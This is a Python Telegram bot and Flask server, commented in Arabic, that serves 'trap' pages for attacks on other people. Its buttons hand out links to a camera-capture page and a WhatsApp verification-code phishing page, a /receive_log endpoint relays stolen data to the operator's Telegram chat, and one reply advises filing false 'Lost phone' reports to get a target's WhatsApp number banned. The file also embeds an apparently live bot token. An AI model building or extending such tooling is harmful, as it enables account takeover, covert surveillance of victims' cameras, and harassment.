import telebot
from telebot import types
import os
from flask import Flask, request
import threading

# 1. التوكن الجديد الذي حصلت عليه
TOKEN = '8468154462:AAGTg6240gaLdkIfAFeILNZn3MSBKXPdDHU' 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# 2. رابط السيرفر الخاص بك
BASE_URL = "https://shadow-core-v2.onrender.com"
MY_CHAT_ID = "6190861110"

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    # أسماء الأزرار المحدثة
    btns = ['📸 اختراق الكاميرا', '💬 سحب كود واتساب', '🚫 حظر رقم واتساب', '📂 السيطرة الكاملة']
    markup.add(*(types.KeyboardButton(b) for b in btns))
    bot.send_message(message.chat.id, "✅ **النظام يعمل الآن بالتوكن الجديد!**\nاضغط على أي زر لإرسال رابط الاختراق.", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    # ربط الأزرار بالروابط لترسل لك الرابط فوراً
    if 'الكاميرا' in message.text:
        bot.reply_to(message, f"🔗 **رابط سحب الصور:**\n{BASE_URL}/cam")
    elif 'واتساب' in message.text:
        bot.reply_to(message, f"🔗 **رابط سحب كود الواتساب:**\n{BASE_URL}/whatsapp")
    elif 'حظر' in message.text:
        bot.reply_to(message, "⚠️ أرسل 'Lost phone' لـ support@whatsapp.com مع الرقم المطلوب.")
    else:
        bot.reply_to(message, "⚙️ جاري تجهيز الرابط.. تأكد من وجود ملفات HTML في GitHub.")

# تشغيل صفحات الفخاخ (تأكد من وجود الملفات في GitHub)
@app.route('/cam')
def cam(): return open('cam.html').read()

@app.route('/whatsapp')
def wa(): return open('whatsapp.html').read()

@app.route('/receive_log', methods=['POST'])
def log():
    bot.send_message(MY_CHAT_ID, request.json.get('content'))
    return "OK", 200

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    bot.remove_webhook() # خطوة إجبارية لمنع التعارض 409
    threading.Thread(target=run).start()
    bot.polling(none_stop=True)
